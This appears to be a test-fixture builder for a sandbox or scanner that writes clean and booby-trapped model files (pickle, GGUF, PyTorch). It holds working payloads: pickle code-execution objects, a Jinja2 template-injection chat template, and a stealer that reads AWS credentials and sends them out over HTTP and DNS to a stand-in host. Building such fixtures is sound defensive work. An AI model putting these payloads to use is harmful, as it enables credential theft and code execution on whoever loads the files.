"""Builds model files for the chamber test. Payloads only run in the test VM."""
import io
import pickle
import struct
import sys
import zipfile

out = sys.argv[1]


class Run:
    """Pickles to a call of a callable, the usual pickle payload."""

    def __init__(self, fn, *args):
        self.fn, self.args = fn, args

    def __reduce__(self):
        return self.fn, self.args


STEALER = """
import base64, os, socket
path = os.path.expanduser("~/.aws/credentials")
if os.path.exists(path):
    secret = open(path, "rb").read()
    s = socket.create_connection(("203.0.113.9", 443), timeout=5)
    s.sendall(b"POST /c HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n" + base64.b64encode(secret))
    s.close()
    d = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    d.settimeout(2)
    h = secret.hex()[:60]
    name = b"".join(bytes([len(p)]) + p for p in [h[:60].encode(), b"evil", b"example"]) + b"\\0"
    d.sendto(b"\\x12\\x34\\x01\\0\\0\\1\\0\\0\\0\\0\\0\\0" + name + b"\\0\\1\\0\\1", ("8.8.8.8", 53))
    d.recv(512)
"""


def dump(name, value):
    with open(f"{out}/{name}", "wb") as f:
        pickle.dump(value, f, protocol=2)


dump("clean.pkl", {"weights": [1.0, 2.0, 3.0], "name": "tiny"})
dump("rce.pkl", Run(__import__("os").system, "id > /dev/null"))
dump("stealer.pkl", Run(exec, STEALER))


def gguf(path, template):
    def text(s):
        s = s.encode()
        return struct.pack("<Q", len(s)) + s

    kvs = [("general.architecture", "llama"), ("tokenizer.chat_template", template)]
    blob = b"GGUF" + struct.pack("<IQQ", 3, 1, len(kvs))
    for key, value in kvs:
        blob += text(key) + struct.pack("<I", 8) + text(value)
    blob += text("t") + struct.pack("<I", 1) + struct.pack("<Q", 4) + struct.pack("<IQ", 0, 0)
    blob += b"\0" * (-len(blob) % 32) + struct.pack("<4f", 1, 2, 3, 4)
    with open(path, "wb") as f:
        f.write(blob)


gguf(f"{out}/clean.gguf", "{% for m in messages %}{{ m.role }}: {{ m.content }}{% endfor %}")
gguf(f"{out}/ssti.gguf", "{{ cycler.__init__.__globals__.os.popen('id').read() }}")


def pt(path, body):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_STORED) as z:
        z.writestr("archive/data.pkl", body)
        z.writestr("archive/byteorder", "little")
        z.writestr("archive/version", "3\n")
    with open(path, "wb") as f:
        f.write(buffer.getvalue())


pt(f"{out}/clean.pt", pickle.dumps({"a": 1}, protocol=2))
pt(f"{out}/rce.pt", pickle.dumps(Run(__import__("os").system, "id > /dev/null"), protocol=2))
